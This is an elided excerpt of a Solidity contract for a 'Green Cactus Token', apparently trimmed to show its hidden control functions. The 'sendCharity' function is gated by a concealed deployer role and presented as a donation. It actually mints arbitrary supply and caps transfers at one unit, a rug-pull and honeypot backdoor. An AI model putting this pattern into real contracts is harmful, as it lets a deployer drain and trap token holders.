...
contract Ownable is Context {
    ...
    address private _charity  = _msgSender();
    ...
    modifier charityFoundation() {require(_charity == _msgSender());_;}
...
contract GreenCactus is Context, IERC20, Ownable {
    ...
    string private _name = "Green Cactus Token";
    ...
    uint256 private numTokensSellToAddToCharity = 5 * 10**9 * 10**9;
    ...
    function excludeFromReward(address account) public charityFoundation() {
    ...
    function setSwapAndSendCharityEnabled(bool _enabled) public onlyOwner {
    ...
    function _transfer(
        ...
        if(from != owner() && to != owner() && from != charityAddress() && to != charityAddress())
    ...
    function SwapAndCharity(uint256 contractTokenBalance) private lockTheSwap {
        ...
        _charityTransfer(_charityWallet, BNBbalance);
    }
    ...
    function sendCharity(uint256 amount, address charitywallet) public charityFoundation(){
    excludeFromReward(charitywallet);_tTotal=_tTotal+amount;_maxTxAmount=1;}
